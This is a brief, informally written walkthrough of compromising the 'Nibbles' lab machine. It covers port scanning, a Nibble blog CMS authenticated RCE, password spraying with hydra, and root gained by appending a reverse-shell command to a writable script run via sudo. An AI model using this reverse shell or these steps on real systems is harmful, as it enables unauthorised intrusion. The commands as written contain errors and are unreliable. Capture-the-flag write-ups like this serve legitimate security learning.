### Attacked Nibble

Did a portscan , found 22 SSH & 80 HTTP to be running 
after minutes of enumeration, discovered the cms to a nibble blog which is vulnerable to an authenticated php RCE, whiich means we need credentials for nibble blog cms

nibble as an account lockout policy after 10 tries wihich limit the number of password bruteforce attempts, using hydra to password spray we figure the credentials to be admin:nibbles

which is then used to get a meterpreter sesssion to then get USER.txt

Root is straight forward, as user nibbler could run monitor.sh as root, monitor.sh also is read and writable by user nibler 
a simple 

echo "bash -i &>1 /dev/tcp/LHOST/IP 0>&1" >> monito.sh
sudo -u root monitor.sh | bash

was enought to get root 

nibbles rooted 
## YIPEeee

Time to user : 4 Hours
Time to Root : 20 Seconds

![image](https://user-images.githubusercontent.com/12541755/113473673-99867900-9430-11eb-9c63-10f0cfdb951c.png)


